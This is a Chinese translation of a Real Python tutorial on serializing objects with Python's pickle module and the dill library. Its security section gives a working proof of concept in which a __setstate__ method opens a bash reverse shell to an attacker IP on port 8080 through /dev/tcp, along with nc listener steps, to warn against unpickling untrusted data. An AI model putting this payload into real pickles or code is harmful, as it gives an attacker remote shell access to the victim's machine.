# Python pickle 模块:如何在 Python 中持久化对象

> 原文：<https://realpython.com/python-pickle-module/>

*立即观看**本教程有真实 Python 团队创建的相关视频课程。和书面教程一起看，加深理解: [**用 Python pickle 模块**](/courses/pickle-serializing-objects/) 序列化对象

作为开发人员，您有时可能需要通过网络发送复杂的对象层次结构，或者将对象的内部状态保存到磁盘或数据库中以备后用。为了实现这一点，您可以使用一个称为**序列化**的过程，由于 Python **`pickle`** 模块，该过程得到了标准库的完全支持。

在本教程中，您将学习:

*   对一个对象进行**序列化**和**反序列化**意味着什么
*   哪些**模块**可以用来序列化 Python 中的对象
*   哪些类型的对象可以用 Python **`pickle`** 模块序列化
*   如何使用 Python `pickle`模块序列化**对象层次结构**
*   当反序列化来自不可信来源的对象时，**风险**是什么

我们去腌制吧！

**免费奖励:** [掌握 Python 的 5 个想法](https://realpython.com/bonus/python-mastery-course/)，这是一个面向 Python 开发者的免费课程，向您展示将 Python 技能提升到下一个水平所需的路线图和心态。

## Python 中的序列化

**序列化**过程是一种将数据结构转换成可以存储或通过网络传输的线性形式的方法。

在 Python 中，序列化允许您将复杂的对象结构转换成字节流，可以保存到磁盘或通过网络发送。你也可以看到这个过程被称为**编组**。取一个字节流并将其转换回数据结构的反向过程被称为**反序列化**或**解组**。

序列化可以用在许多不同的情况下。最常见的用途之一是在训练阶段之后保存神经网络的状态，以便您可以在以后使用它，而不必重新进行训练。

Python 在标准库中提供了三个不同的[模块](https://realpython.com/python-modules-packages/)，允许您序列化和反序列化对象:

1.  [`marshal`](https://docs.python.org/3/library/marshal.html) 模块
2.  [`json`](https://docs.python.org/3/library/json.html) 模块
3.  [`pickle`](https://docs.python.org/3/library/pickle.html) 模块

此外，Python 支持 [XML](https://www.xml.com/axml/axml.html) ，也可以用它来序列化对象。

`marshal`模块是上面列出的三个模块中最老的一个。它的存在主要是为了读写 Python 模块编译后的字节码，或者解释器[导入](https://realpython.com/absolute-vs-relative-python-imports/)一个 Python 模块时得到的`.pyc`文件。所以，尽管你可以使用`marshal`来序列化你的一些对象，但这并不推荐。

`json`模块是三个中最新的一个。它允许您使用标准的 JSON 文件。JSON 是一种非常方便且广泛使用的数据交换格式。

选择 [JSON 格式](https://realpython.com/lessons/serializing-json-data/)有几个原因:它是**人类可读的**和**语言独立的**，它比 XML 更轻便。使用`json`模块，您可以序列化和反序列化几种标准 Python 类型:

*   [T2`bool`](https://realpython.com/python-boolean/)
*   [T2`dict`](https://realpython.com/python-dicts/)
*   [T2`int`](https://realpython.com/python-numbers/#integers)
*   [T2`float`](https://realpython.com/python-numbers/#floating-point-numbers)
*   [T2`list`](https://realpython.com/python-lists-tuples/)
*   [T2`string`](https://realpython.com/python-strings/)
*   [T2`tuple`](https://realpython.com/python-lists-tuples/)
*   [T2`None`](https://realpython.com/null-in-python/)

Python `pickle`模块是在 Python 中序列化和反序列化对象的另一种方式。它与`json`模块的不同之处在于它以二进制格式序列化对象，这意味着结果不是人类可读的。然而，它也更快，并且开箱即用，可以处理更多的 Python 类型，包括您的自定义对象。

**注意:**从现在开始，你会看到术语**picking**和**unpicking**用来指用 Python `pickle`模块进行序列化和反序列化。

因此，在 Python 中有几种不同的方法来序列化和反序列化对象。但是应该用哪一个呢？简而言之，没有放之四海而皆准的解决方案。这完全取决于您的用例。

以下是决定使用哪种方法的三个一般准则:

1.  不要使用`marshal`模块。它主要由解释器使用，官方文档警告说 Python 维护者可能会以向后不兼容的方式修改格式。

2.  如果您需要与不同语言或人类可读格式的互操作性，那么`json`模块和 XML 是不错的选择。

3.  Python `pickle`模块是所有剩余用例的更好选择。如果您不需要人类可读的格式或标准的可互操作格式，或者如果您需要序列化定制对象，那么就使用`pickle`。

[*Remove ads*](/account/join/)

## 在 Python `pickle`模块内部

Python `pickle`模块基本上由四个方法组成:

1.  `pickle.dump(obj, file, protocol=None, *, fix_imports=True, buffer_callback=None)`
2.  `pickle.dumps(obj, protocol=None, *, fix_imports=True, buffer_callback=None)`
3.  `pickle.load(file, *, fix_imports=True, encoding="ASCII", errors="strict", buffers=None)`
4.  `pickle.loads(bytes_object, *, fix_imports=True, encoding="ASCII", errors="strict", buffers=None)`

前两种方法在酸洗过程中使用，另外两种在拆线过程中使用。`dump()`和`dumps()`之间唯一的区别是前者创建一个包含序列化结果的文件，而后者返回一个字符串。

为了区分`dumps()`和`dump()`，记住函数名末尾的`s`代表`string`是很有帮助的。同样的概念也适用于`load()`和`loads()`:第一个读取一个文件开始拆包过程，第二个操作一个字符串。

考虑下面的例子。假设您有一个名为`example_class`的自定义类，它有几个不同的属性，每一个都是不同的类型:

*   `a_number`
*   `a_string`
*   `a_dictionary`
*   `a_list`
*   `a_tuple`

下面的例子展示了如何实例化该类并处理该实例以获得一个普通的字符串。在 pickledd 类之后，您可以在不影响 pickle 字符串的情况下更改其属性值。然后，您可以在另一个[变量](https://realpython.com/python-variables/)中取消 pickle 字符串，恢复之前 pickle 类的精确副本:

```py
# pickling.py
import pickle

class example_class:
    a_number = 35
    a_string = "hey"
    a_list = [1, 2, 3]
    a_dict = {"first": "a", "second": 2, "third": [1, 2, 3]}
    a_tuple = (22, 23)

my_object = example_class()

my_pickled_object = pickle.dumps(my_object)  # Pickling the object
print(f"This is my pickled object:\n{my_pickled_object}\n")

my_object.a_dict = None

my_unpickled_object = pickle.loads(my_pickled_object)  # Unpickling the object
print(
    f"This is a_dict of the unpickled object:\n{my_unpickled_object.a_dict}\n")
```

在上面的例子中，您创建了几个不同的对象，并用`pickle`将它们序列化。这会产生一个带有序列化结果的字符串:

```py
$ python pickling.py
This is my pickled object:
b'\x80\x03c__main__\nexample_class\nq\x00)\x81q\x01.'

This is a_dict of the unpickled object:
{'first': 'a', 'second': 2, 'third': [1, 2, 3]}
```

酸洗过程正确结束，将整个实例存储在这个字符串中:`b'\x80\x03c__main__\nexample_class\nq\x00)\x81q\x01.'`酸洗过程结束后，通过将属性`a_dict`设置为`None`来修改原始对象。

最后，将字符串拆成一个全新的实例。你得到的是从酸洗过程开始的原始对象结构的[深层副本](https://realpython.com/copying-python-objects/)。

## Python `pickle`模块的协议格式

如上所述，`pickle`模块是 Python 特有的，酸洗过程的结果只能由另一个 Python 程序读取。但是，即使您正在使用 Python，知道`pickle`模块已经随着时间的推移而发展也是很重要的。

这意味着，如果您已经使用特定版本的 Python 对一个对象进行了 pickle，那么您可能无法使用旧版本对其进行解 pickle。兼容性取决于您用于酸洗过程的协议版本。

Python `pickle`模块目前可以使用六种不同的协议。协议版本越高，Python 解释器就需要越新的版本来进行解包。

1.  **协议版本 0** 是第一个版本。不像后来的协议，它是人类可读的。
2.  协议版本 1 是第一个二进制格式。
3.  **协议版本 2** 在 Python 2.3 中引入。
4.  **Python 3.0 中增加了协议版本 3** 。用 Python 2.x 是解不开的。
5.  **Python 3.4 新增协议版本 4** 。它支持更广泛的对象大小和类型，是从 [Python 3.8](https://realpython.com/python38-new-features/) 开始的默认协议。
6.  **Python 3.8 新增协议版本 5** 。它支持[带外数据](https://en.wikipedia.org/wiki/Out-of-band_data)，并提高了带内数据的速度。

**注意:**新版本的协议提供了更多的功能和改进，但仅限于更高版本的解释器。在选择使用哪种协议时，一定要考虑到这一点。

为了识别您的解释器支持的最高协议，您可以检查`pickle.HIGHEST_PROTOCOL`属性的值。

要选择特定的协议，您需要在调用`load()`、`loads()`、`dump()`或`dumps()`时指定协议版本。如果你没有指定一个协议，那么你的解释器将使用在`pickle.DEFAULT_PROTOCOL`属性中指定的默认版本。

[*Remove ads*](/account/join/)

## 可选择和不可选择类型

您已经了解到 Python `pickle`模块可以序列化比`json`模块更多的类型。然而，并不是所有的东西都是可以挑选的。不可拆分对象的列表包括数据库连接、打开的网络套接字、正在运行的线程等。

如果你发现自己面对一个不可拆卸的物体，那么你可以做几件事情。第一种选择是使用第三方库，比如`dill`。

`dill`模块扩展了`pickle`的功能。根据[官方文档](https://pypi.org/project/dill/)，它可以让你序列化不太常见的类型，比如[函数](https://realpython.com/defining-your-own-python-function/)与[产生](https://realpython.com/introduction-to-python-generators/)、[嵌套函数](https://realpython.com/inner-functions-what-are-they-good-for/)、 [lambdas](https://realpython.com/courses/python-lambda-functions/) 等等。

为了测试这个模块，您可以尝试 pickle 一个`lambda`函数:

```py
# pickling_error.py
import pickle

square = lambda x : x * x
my_pickle = pickle.dumps(square)
```

如果您试图运行这个程序，那么您将会得到一个异常，因为 Python `pickle`模块不能序列化一个`lambda`函数:

```py
$ python pickling_error.py
Traceback (most recent call last):
 File "pickling_error.py", line 6, in <module>
 my_pickle = pickle.dumps(square)
_pickle.PicklingError: Can't pickle <function <lambda> at 0x10cd52cb0>: attribute lookup <lambda> on __main__ failed
```

现在尝试用`dill`替换 Python `pickle`模块，看看是否有什么不同:

```py
# pickling_dill.py
import dill

square = lambda x: x * x
my_pickle = dill.dumps(square)
print(my_pickle)
```

如果您运行这段代码，那么您会看到`dill`模块序列化了`lambda`而没有返回错误:

```py
$ python pickling_dill.py
b'\x80\x03cdill._dill\n_create_function\nq\x00(cdill._dill\n_load_type\nq\x01X\x08\x00\x00\x00CodeTypeq\x02\x85q\x03Rq\x04(K\x01K\x00K\x01K\x02KCC\x08|\x00|\x00\x14\x00S\x00q\x05N\x85q\x06)X\x01\x00\x00\x00xq\x07\x85q\x08X\x10\x00\x00\x00pickling_dill.pyq\tX\t\x00\x00\x00squareq\nK\x04C\x00q\x0b))tq\x0cRq\rc__builtin__\n__main__\nh\nNN}q\x0eNtq\x0fRq\x10.'
```

`dill`的另一个有趣的特性是它甚至可以序列化整个解释器会话。这里有一个例子:

>>>

```py
>>> square = lambda x : x * x
>>> a = square(35)
>>> import math
>>> b = math.sqrt(484)
>>> import dill
>>> dill.dump_session('test.pkl')
>>> exit()
```

在这个例子中，您启动解释器，[导入](https://realpython.com/python-import/)一个模块，并定义一个`lambda`函数以及几个其他变量。然后导入`dill`模块并调用`dump_session()`来序列化整个会话。

如果一切顺利，那么您应该在当前目录中获得一个`test.pkl`文件:

```py
$ ls test.pkl
4 -rw-r--r--@ 1 dave  staff  439 Feb  3 10:52 test.pkl
```

现在，您可以启动解释器的一个新实例，并加载`test.pkl`文件来恢复您的最后一个会话:

>>>

```py
>>> globals().items()
dict_items([('__name__', '__main__'), ('__doc__', None), ('__package__', None), ('__loader__', <class '_frozen_importlib.BuiltinImporter'>), ('__spec__', None), ('__annotations__', {}), ('__builtins__', <module 'builtins' (built-in)>)])
>>> import dill
>>> dill.load_session('test.pkl')
>>> globals().items()
dict_items([('__name__', '__main__'), ('__doc__', None), ('__package__', None), ('__loader__', <class '_frozen_importlib.BuiltinImporter'>), ('__spec__', None), ('__annotations__', {}), ('__builtins__', <module 'builtins' (built-in)>), ('dill', <module 'dill' from '/usr/local/lib/python3.7/site-packages/dill/__init__.py'>), ('square', <function <lambda> at 0x10a013a70>), ('a', 1225), ('math', <module 'math' from '/usr/local/Cellar/python/3.7.5/Frameworks/Python.framework/Versions/3.7/lib/python3.7/lib-dynload/math.cpython-37m-darwin.so'>), ('b', 22.0)])
>>> a
1225
>>> b
22.0
>>> square
<function <lambda> at 0x10a013a70>
```

第一个`globals().items()`语句表明解释器处于初始状态。这意味着您需要导入`dill`模块并调用`load_session()`来恢复您的序列化解释器会话。

**注意:**在你用`dill`代替`pickle`之前，请记住`dill`不包含在 Python 解释器的标准库中，并且通常比`pickle`慢。

即使`dill`比`pickle`允许你序列化更多的对象，它也不能解决你可能遇到的所有序列化问题。例如，如果您需要序列化一个包含数据库连接的对象，那么您会遇到困难，因为即使对于`dill`来说，它也是一个不可序列化的对象。

那么，如何解决这个问题呢？

这种情况下的解决方案是将对象从序列化过程中排除，并在对象被反序列化后**重新初始化**连接。

您可以使用`__getstate__()`来定义酸洗过程中应包含的内容。此方法允许您指定您想要腌制的食物。如果不覆盖`__getstate__()`，那么将使用默认实例的`__dict__`。

在下面的例子中，您将看到如何用几个属性定义一个类，并用`__getstate()__`从序列化中排除一个属性:

```py
# custom_pickling.py

import pickle

class foobar:
    def __init__(self):
        self.a = 35
        self.b = "test"
        self.c = lambda x: x * x

    def __getstate__(self):
        attributes = self.__dict__.copy()
        del attributes['c']
        return attributes

my_foobar_instance = foobar()
my_pickle_string = pickle.dumps(my_foobar_instance)
my_new_instance = pickle.loads(my_pickle_string)

print(my_new_instance.__dict__)
```

在本例中，您创建了一个具有三个属性的对象。因为一个属性是一个`lambda`，所以这个对象不能用标准的`pickle`模块来拾取。

为了解决这个问题，您可以使用`__getstate__()`指定要处理的内容。首先克隆实例的整个`__dict__`,使所有属性都定义在类中，然后手动删除不可拆分的`c`属性。

如果您运行这个示例，然后反序列化该对象，那么您将看到新实例不包含`c`属性:

```py
$ python custom_pickling.py
{'a': 35, 'b': 'test'}
```

但是，如果您想在解包时做一些额外的初始化，比如将被排除的`c`对象添加回反序列化的实例，该怎么办呢？您可以通过`__setstate__()`来实现这一点:

```py
# custom_unpickling.py
import pickle

class foobar:
    def __init__(self):
        self.a = 35
        self.b = "test"
        self.c = lambda x: x * x

    def __getstate__(self):
        attributes = self.__dict__.copy()
        del attributes['c']
        return attributes

    def __setstate__(self, state):
        self.__dict__ = state
        self.c = lambda x: x * x

my_foobar_instance = foobar()
my_pickle_string = pickle.dumps(my_foobar_instance)
my_new_instance = pickle.loads(my_pickle_string)
print(my_new_instance.__dict__)
```

通过将被排除的`c`对象传递给`__setstate__()`，可以确保它出现在被取消拾取的字符串的`__dict__`中。

[*Remove ads*](/account/join/)

## 腌制物品的压缩

虽然`pickle`数据格式是对象结构的紧凑二进制表示，但是您仍然可以通过用`bzip2`或`gzip`压缩它来优化您的腌串。

要[用`bzip2`压缩](https://realpython.com/working-with-files-in-python/)一个腌串，可以使用标准库中提供的`bz2`模块。

在下面的例子中，您将获取一个[字符串](https://realpython.com/python-strings/)，对其进行处理，然后使用`bz2`库对其进行压缩:

>>>

```py
>>> import pickle
>>> import bz2
>>> my_string = """Per me si va ne la città dolente,
... per me si va ne l'etterno dolore,
... per me si va tra la perduta gente.
... Giustizia mosse il mio alto fattore:
... fecemi la divina podestate,
... la somma sapienza e 'l primo amore;
... dinanzi a me non fuor cose create
... se non etterne, e io etterno duro.
... Lasciate ogne speranza, voi ch'intrate."""
>>> pickled = pickle.dumps(my_string)
>>> compressed = bz2.compress(pickled)
>>> len(my_string)
315
>>> len(compressed)
259
```

使用压缩时，请记住较小的文件是以较慢的进程为代价的。

## Python `pickle`模块的安全问题

您现在知道了如何使用`pickle`模块在 Python 中序列化和反序列化对象。当您需要将对象的状态保存到磁盘或通过网络传输时，序列化过程非常方便。

然而，关于 Python `pickle`模块还有一件事你需要知道:它是不安全的。还记得`__setstate__()`的讨论吗？这个方法非常适合在解包时进行更多的初始化，但是它也可以用来在解包过程中执行任意代码！

那么，你能做些什么来降低这种风险呢？

可悲的是，不多。经验法则是**永远不要解压来自不可信来源或通过不安全网络传输的数据**。为了防止[中间人攻击](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)，使用`hmac`之类的库对数据进行签名并确保它没有被篡改是个好主意。

以下示例说明了解除被篡改的 pickle 会如何将您的系统暴露给攻击者，甚至给他们一个有效的远程外壳:

```py
# remote.py
import pickle
import os

class foobar:
    def __init__(self):
        pass

    def __getstate__(self):
        return self.__dict__

    def __setstate__(self, state):
        # The attack is from 192.168.1.10
        # The attacker is listening on port 8080
        os.system('/bin/bash -c
                  "/bin/bash -i >& /dev/tcp/192.168.1.10/8080 0>&1"')

my_foobar = foobar()
my_pickle = pickle.dumps(my_foobar)
my_unpickle = pickle.loads(my_pickle)
```

在这个例子中，拆包进程执行`__setstate__()`，它执行一个 Bash 命令来打开端口`8080`上的`192.168.1.10`机器的远程 shell。

以下是如何在您的 Mac 或 Linux 机器上安全地测试这个脚本。首先，打开终端并使用`nc`命令监听到端口 8080 的连接:

```py
$ nc -l 8080
```

这将是*攻击者*终端。如果一切正常，那么命令似乎会挂起。

接下来，在同一台计算机上(或网络上的任何其他计算机上)打开另一个终端，并执行上面的 Python 代码来清除恶意代码。确保将代码中的 [IP 地址](https://realpython.com/python-ipaddress-module/)更改为攻击终端的 IP 地址。在我的例子中，攻击者的 IP 地址是`192.168.1.10`。

通过执行此代码，受害者将向攻击者公开一个外壳:

```py
$ python remote.py
```

如果一切正常，攻击控制台上会出现一个 Bash shell。该控制台现在可以直接在受攻击的系统上运行:

```py
$ nc -l 8080
bash: no job control in this shell

The default interactive shell is now zsh.
To update your account to use zsh, please run `chsh -s /bin/zsh`.
For more details, please visit https://support.apple.com/kb/HT208050.
bash-3.2$
```

所以，让我再重复一遍这个关键点:**不要使用`pickle`模块来反序列化来自不可信来源的对象！**

[*Remove ads*](/account/join/)

## 结论

现在您知道了如何使用 Python `pickle`模块将对象层次结构转换成可以保存到磁盘或通过网络传输的字节流。您还知道 Python 中的反序列化过程必须小心使用，因为对来自不可信来源的东西进行拆包是非常危险的。

**在本教程中，您已经学习了:**

*   对一个对象进行**序列化**和**反序列化**意味着什么
*   哪些**模块**可以用来序列化 Python 中的对象
*   哪些类型的对象可以用 Python **`pickle`** 模块序列化
*   如何使用 Python `pickle`模块序列化**对象层次结构**
*   从不受信任的来源获取信息的**风险**是什么

有了这些知识，您就为使用 Python `pickle`模块持久化对象做好了准备。作为额外的奖励，您可以向您的朋友和同事解释反序列化恶意 pickles 的危险。

如果您有任何问题，请在下面留下评论或通过 [Twitter](https://twitter.com/mastro35) 联系我！

*立即观看**本教程有真实 Python 团队创建的相关视频课程。和书面教程一起看，加深理解: [**用 Python pickle 模块**](/courses/pickle-serializing-objects/) 序列化对象******